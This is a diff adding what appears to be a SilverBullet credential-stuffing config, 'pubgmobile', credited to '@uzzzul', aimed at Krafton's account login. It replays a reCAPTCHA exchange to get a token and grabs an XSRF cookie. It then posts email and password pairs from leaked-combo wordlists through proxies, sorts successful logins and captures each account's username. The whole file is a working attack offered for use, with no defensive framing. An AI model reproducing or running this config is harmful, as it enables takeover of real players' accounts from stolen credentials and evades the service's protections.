@@ -1,0 +1,155 @@
+[SETTINGS]
+{
+  "Name": "pubgmobile",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-12-21T21:28:27.3930094+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@uzzzul",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "pubgmobile",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://recaptcha.net/recaptcha/api2/anchor?ar=1&k=6LfapbYUAAAAAGqqePOX3oiNl5O0L7YWwoztq0cC&co=aHR0cHM6Ly9hY2NvdW50cy5rcmFmdG9uLmNvbTo0NDM.&hl=en&v=VZKEDW9wslPbEc9RmzMqaOAP&size=invisible&cb=a8j7onh8h7ej" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+
+#1 PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\">" -> VAR "1" 
+
+#POST REQUEST POST "https://recaptcha.net/recaptcha/api2/reload?k=6LfapbYUAAAAAGqqePOX3oiNl5O0L7YWwoztq0cC" 
+  CONTENT "v=VZKEDW9wslPbEc9RmzMqaOAP&reason=q&c=<1>&k=6LfapbYUAAAAAGqqePOX3oiNl5O0L7YWwoztq0cC&co=aHR0cHM6Ly9hY2NvdW50cy5rcmFmdG9uLmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!XFqgWhfIAAbB9JEgwfRHaZEgwL4-5PQ-ACkAIwj8Rt2g8keB6CVJ8wQJzyfBvFfT4rhMUEhimwAFi0sCB-s-XQ9XgQcAAABEVwAAAAJtAQecDRcs4VMMdPENugPoCU6xoMU7jVUbqvgzIfKY8w-SGnsoBPcCPzge8rCTj6_0J5jQZxec96P_qNs0v5YFyYedmGUPfP2WS5g6XyJ8DGDiwq2Jw3an3ekKD0ltVfIOlp_oQiZ6NQoDHgN2Vd8WSanV_vJeC-NMGEpVv2sEHkoGSAGEnwjP0ib9LLSzL__VlT0sKowfOfgIca3xg8YVkvPciK1JA_6YPfhJhzxwyRVhIcD-cr9ZkYo-M5yF3Ga34VOTAVSUbOZGj0QB1i0Arj6riR9qsTLrw9-2p1C_6M-2Ux4qr9es7mO71Ofda7FWd9bfecP73xgx8MDdIb76ZqfNRIjCnAPEBwS-PDNwG_yVx8oUU6IgRdRV_0jlQyMcBtN-js1JwLNQDvkw2Fz3E92ZObjKdpSaORXXL8VMaqVm3WO2wU68U1bGRLGKOgmWyvj3ex8qRsSppN-XkJFEEyG9I1MXFnsnjMCJX7a6scQVT1_cZOGGXaxCMOUpYWUHE7D9Xog9ev9kRTboctDfW7AtUJrMWnoV5A-CtQ5_p-yuIBkWRZbJtrokefsakKRr5UEfddr8gEeuHzf-blcJawtTMDEZXlUgHnSGMsZsSvX8Wg9r_Lj2X6XPbcY-zwip6mpl1XXjtyp6EZEtp5NiLmdPRXXAdAz2jCO5wwyjDFEc3mxxA5Yd1tS5-nD6STb5XBnRiFDCBIXY52lbs7o0RJvKz1j_Ul3FbcCoggC0TPlYBdcKrJ25NjN8IW6w12fcw0VazaBwNFhSjEbJR9FropfwpVStt9dHQFhYJz1cBl7reKGYu6oAfnBXdXDRCacDxMwkBLkXCbYh-c1kKx0rS0H0YOkiqzf1TFV49FlflaQ-NYW7PyOISajnVi3vZz1YENW23CrhcZ8zN5xNxchC1npR2ofUjudOormQ5WRMKdUP2u4AX2o1p9okpylZMmTBsweHoDZVs-vbB64YGqpSq7HJpLt6LYP7dk_-ch7fVixPhkB7bG7Gb1yPGeu3WzTEmJiQpSO5HJRgrZEvSUNsvYRGRwj_vgMQlr3-FZT-rdAmMPVSpJ2IOmJG15ntAZk9XJfxbIefiIISwtTzL0wX_WzK69QBcyuAcualGglMzPqJooDsB961zidWdfaKfGVAoTo3n6q_vm-R2NdlVduRcdcWlZqGu9I9duPB9j4XZ7Bm787IjLsbNwOUUfB288IFelN1gWttBsUBMIA5FIfG_nck3X6DsRDGeOw9mUgOE9AAgKci1Lte9K2hS1fSsDokZRnCZZ15LP7jfW51WCpMT1kNUhOPVXPCp3vwTitKAUXgR6suqWCo6ivE_4rehihEw_ooRQV-Ikf5TrUEtOLCexCughFndroQHoYF4oBHrqr4m26j0OMqbguVkqXAb8SIHgptZHNTZbXNrgcuG1GHB1p3bSz0a7iZiIwQKkg3DwdlIfzO-ozcpWzGmRbwE3bRmfNDJ6zic1nG0VWUt3xKiFubv_sU4zc9LpUL3HYrb0MLyBITrgwhyoqGFYGpaJTaK_pYD61VYAwYW3644-18-gOsyzf2aSMJ2d8UsCrBLRpAQL0VH1vV_n8OUx3f-pwnMDxj2-nGLl6pkZKKd3Y3AR94V7wCO2iUpSqHKF8CdMjuhCtWsvGoB168Fo13iINhJGRIYnkOPlr-7YLspcC_dkxq-qsZis0OJahrB17cVJdUueuHZTmShxIfGIhIDvwH5VfI0qM2LTlDCozJ5zgL-thAMEKm7LLWOSpzrMFtDtVC8EBWPj9EhSecdQ0m2QTL1btsG1nXERkjuIvZM9aiUXMS-xURtdvyU7acIImRqk3h6YETY3Jol7R2vonjBCpBX8MN_IREplbr6vemQnDGWATl5Hn8xLGjGwKwNwufFum7B1cr89yD9Y1L7SPPYIRb3d1Hd4gef9Oua8ligdvU1SD7yKpS8kR10U8We8F4O5hAuP73rhygha7uH0mO-2sHPifsEIsAmEzkUp56w1PhvoHInFhDTWQE2Tah8fst1nokCDxldLal3T6BFnvhzWINCL_GSBtO6psO4W2OncvnGWma3ObD1WyxXOKE5IvpSIx16fgu995Q-VJrDsklb2DXEh5fdSEf9eoOg42Eo6wY5q57KZfkaprP4eWy35-LNYnYU0DXOauvIc3rLutx4a-1TOnXbzQWnmLO2IYiQtgYVnWw4jC1q1SMUu1ewGaOBNeSUO2ZYLhD6damKKAFL2u-s27--OVRd_IqkgPzmjEVtvmKu5PLpToJfsmKbv2uMSKZHrjOCSX1P1JesgbEdOamoRvDGu5bU1OL4ZCDCe1gVa-RIhZmRk6dXt8unakMqeMAddGyWyIVkmHMQRRXCljG1UgjRMhUTqDru330ffU2xmKbIW02EcOPLyALTyIxvMfVXRJvkN6UZNLJMxwH5VvYqupV2xd9uPaTO_o0cu1hmXQIzU-DovC5ur0sfMfVVwaqmY7QEJ9HNaI7cT-DGdZfeOGCjs1J2jHELiDkFkYpp04F_2OmO-5m8wzzEgQ7T00BjP-se00nTbRwUHUB0JcvMdWl59Mqs2xsjTRJ-lJ57IX2LRul40UTnKLUdnzzoSbEkwVYFlu7E13V5JLL1xXT0_C5kR9oHPLgx1pj1Mk-MDAUr4pCMbECQtZyIbp9Yy1BYUCQfwRqMpuL94y5VUG5Ct-Qjpk10HklOUVhg-IxA05iIiTFrQk93Zuiy13vVTt1I3iPcDAP4SexbOVlv9bEnkFU7DUREnsea41FtyFh-vw6SwbPMfvDdh5wxErnJkfeqdSGlJPIgYxgtfWTY8i8GIt85pvNuc2uu5H5YVghpxSb2pCdLGSzcThQXYnOgZSRyqH3MHxjbsOIoprsU5fcP01cQ8gBa0pz34i7APSJdHsr7D7hBnp5p7gVpAkbDpxvMidO8BelPFrIQtlE2JSNse7EMwE-wQbJWl5kJFiWkcNn7fnTUfdGYrwJCPn3iyF38GUM28qh-k5hLuDtAVtJ7_bH9hkX-xYyiedxA4vQ7WthFg7zT_kM0emuutmenyA0ewoYjLAkzBZ-AjlyHBwjhAxSH0prJYkg7z21SwJthXHVEuvp1HK-cn2iC_gOoApPNNe6kRqpzwFCYf-frDdFNa9OVkPISETatr4mjG0P6Bh29H_466MdLGlP-g-bMzy0YjY_wAXEM-rXRF7b3XDP2Os_G5O0Pkbwz-fnkjGiX7i3d-py1xV6GUOwN7aUywBDMb_OCzvqqbwPfyV3-X_uWl-CMmuGNd4HhIdbUWTsjd7hjQ1OMtnoiYwuXvbGlM5uaYp42H_FGgXznvR28JEwEv6NkeEzZH0GqUZ3SV0U_0LXH6vzifFPzHzUl9VbHqIKQWGgHFYcbAF5OrwF5b5KwTvKe0cfcYCH1dVHNp1CNOW3q9z8wfnys3cHf54C8VwUlr7xidOMe3uMqOi11RZgsTcA0j05Slb6xF3Z3WdWQ7u1Qo77pcKP1TdBAZQ_0FkGn1xTsvVQZj7xJX1wlwd517vX9t53OzW46ocfhUvoq61FqDHzSvQMx9Vx1BGxD2an_tj1XPfNd5MUhRqYT_3tLZRCAqyy9oDvjGF_QvBK7S-KRPrvrUIwB69-659AW6qSTNWXjssnV5YG9jWSDjZlWEVEmyfcIQ0aGZuo-s-6Uf8cnaOqZEv4zNvUOg_9O8A07hA1_WISWPbsai0ngAEdGDJEZvRl2qNgW3Fddda1fWH29CEfsqdnYIOkSZbEFaJUzoMvVJoevIG3oWG9i1U6EImLknDcQ8NQmpF7kYdrzd49JUZEjYwZDE1gRCMhfIg4t4GvThU0CBU8z6cEGWv0oKz6h1-2lWcpi6e1oxNv41i_Y3Gk5T24SzL8sFZGkDeaquCcCfw_SNykODLPc936KBBLTRlXf3r3q90H71oibV5GEO_BNYbywMKwETumzdN6SE9UzHelnsK2NzDwb70n3K26fTMk8Jy_j9PWdEIlNZp-N2eSlZ8NSO7E9ECoSV_g7Py6oFO3ltiWZg-5BtKVIrmfQvTVLkSs2C7G60lW8hbOB_bGrf5acfnLkaLQW8htDKBmIzW5uznHZ_kcnBu2MlB68q9dzCW19kKjUeF-bUMQOL3ZEAYMV8IQkAb8sIgyNVcQW_lYiU3ObjBHIm_0UFW9mcw820QzVqgG8IPmAxXG8zpNJ2YAmuqVh-BhTvNp_4Mwf4yV-sIc16g500d79pybe9R4Tt99Q2phT7T7ajTbgPKEgEyflHeoiBzN-xAHGS4uSO4riqukMkJl0iaVMUvSkozJcBQfpn34jSSk8HkcPmMsXGQzjf0IxuanemwXa59dIP3TGj_ISqnMKfdk8WzqAqv5BBIKg7rvV-02vFQX8uwK4tzygB_6uLmyE6v4CVW-QMgBLCxfFny5R0qMoSEZnaylTd1Mrn695AuY-36rJtg5V9IeAqiUG_1K32Cge2gvfFn5oQ-ALoY" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://recaptcha.net" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://recaptcha.net/recaptcha/api2/anchor?ar=1&k=6LfapbYUAAAAAGqqePOX3oiNl5O0L7YWwoztq0cC&co=aHR0cHM6Ly9hY2NvdW50cy5rcmFmdG9uLmNvbTo0NDM.&hl=en&v=VZKEDW9wslPbEc9RmzMqaOAP&size=invisible&cb=rf7t9as9flof" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#2 PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "2" 
+
+#GET REQUEST GET "https://accounts.krafton.com/location" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-type: application/json" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://accounts.krafton.com/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+
+#XSRF PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" -> VAR "XSRF" 
+
+#USER FUNCTION URLEncode "<USER>" -> VAR "USER" 
+
+#PASS FUNCTION URLEncode "<PASS>" -> VAR "PASS" 
+
+#login REQUEST POST "https://accounts.krafton.com/auth/local" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"recaptcha\":\"<2>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 551" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://accounts.krafton.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://accounts.krafton.com/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "x-xsrf-token: <XSRF>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error.captcha-required" 
+    KEY "error.login-denied" 
+  KEYCHAIN Success OR 
+    KEY "login.success" 
+
+#capture REQUEST GET "https://accounts.krafton.com/profile" 
+  
+
+#USERNAME PARSE "<SOURCE>" LR "username\":\"" "\"" CreateEmpty=FALSE -> CAP "username" 
+
+#AUTHOR FUNCTION Constant "@uzzzul" -> CAP "CONFIGBY" 
+
